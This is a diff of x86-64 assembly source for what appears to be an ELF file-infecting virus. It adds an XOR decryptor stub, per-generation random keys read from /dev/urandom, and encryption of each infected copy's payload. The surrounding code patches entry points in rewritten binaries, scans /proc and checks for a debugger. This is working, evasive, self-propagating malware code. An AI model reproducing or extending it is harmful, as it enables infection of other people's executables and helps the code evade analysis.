@@ -5,14 +5,47 @@ global _start
 
 _start:
 	PUSHAQ
+key:
+	mov rdi, 0x1111111111111111
+	mov rsi, 0x1111111111111111
+	cmp rdi, rsi
+	je main
+	lea rsi, [rel encryption_start]
+	lea rdx, [rel encryption_end]
+	sub rdx, rsi
 	call decryptor
 	jmp main
 
-;decryptor:
-;	enter 0, 0
-;	mov rax, 
-;	leave
-;	ret
+decryptor:	;rdi:key  rsi:addr rdx:size
+	enter 0, 0
+	xor rcx, rcx
+	while_decrypt:
+		cmp rcx, rdx
+		jge end_decryptor
+		trunc_key:
+			mov r9, rdx
+			sub r9, rcx
+			cmp r9, 8
+			jg end_trunc
+			mov r10, r9
+			mov r9, 8
+			sub r9, r10
+			imul r9, 8
+			push rcx
+			mov rcx, r9
+			shl rdi, cl
+			shr rdi, cl
+			pop rcx
+		end_trunc:
+		mov r9, QWORD [rsi]
+		xor r9, rdi
+		mov QWORD [rsi], r9
+		add rsi, 8
+		add rcx, 8
+		jmp while_decrypt
+	end_decryptor:
+	leave
+	ret
 
 encryption_start:
 memcpy:
@@ -359,6 +392,46 @@ fill_data_sec:
 	leave
 	ret
 
+encrypt_new_gen:	; rdi:bin_addr
+	enter 0, 0
+	push rdi
+	lea rdi, [rel rand_file]
+	mov rsi, OPEN_FILE_PERMISSION
+	mov rax, sys_open
+	syscall
+	padding
+	cmp rax, 0
+	jl ret_0
+	sub rsp, 8
+	mov rdi, rax
+	mov rsi, rsp
+	mov rdx, 8
+	push rax
+	mov rax, sys_read
+	syscall
+	padding
+	pop rax
+	mov rdi, rax
+	mov rax, sys_close
+	syscall
+	padding
+
+	mov rdi, QWORD[rsp]		;rdi has the key
+	add rsp, 8
+
+	pop rsi					;rsi has the addr
+	mov rdx, rsi
+	add rdx, key - _start
+	mov QWORD[rdx + 2], rdi	;modify the key in new gen code
+
+	mov rdx, encryption_start - _start
+	add rsi, rdx
+	mov rdx, encryption_end - encryption_start
+	call decryptor
+
+	leave
+	ret
+
 rewrite_binary:
 	enter 0, 0
 	mov r11, rdi	;r11 contient elf_struc
@@ -430,16 +503,21 @@ rewrite_binary:
 	sub rax, QWORD[r11 + elf_struc.old_entry]
 	mov QWORD[rdi], rax
 
+	; ENCRYPTION
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	add rdi, r13
+	sub rdi, PAYLOAD_SIZE
+	push r11
+	call encrypt_new_gen
+	pop r11
+
 
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
 	add rdi, r13
-
 	mov rsi, QWORD[r11 + elf_struc.ehdr]
 	add rsi, QWORD[r11 + elf_struc.new_code_offset]
-
 	mov rdx, QWORD[r11 + elf_struc.stat + stat.st_size]
 	sub rdx, QWORD[r11 + elf_struc.new_code_offset]
-
 	add r13, rdx
 	call memcpy									;copi la fin du bin
 
@@ -835,7 +913,7 @@ check_debug:
 main:
 	call check_debug
 	cmp rax, 1
-	je jmp_old_entry
+	;je jmp_old_entry
 	lea rdi, [rel proc_dir]
 	lea rsi, [rel check_proc]
 	call process_dir
@@ -887,6 +965,8 @@ proc_ban:
 	db 0x74, 0x65, 0x73, 0x74, 0x0a, 0
 new_line:
 	db 0x0a, 0
+rand_file:
+	db '/dev/urandom', 0
 dot:
 	db '.', 0
 ddot:
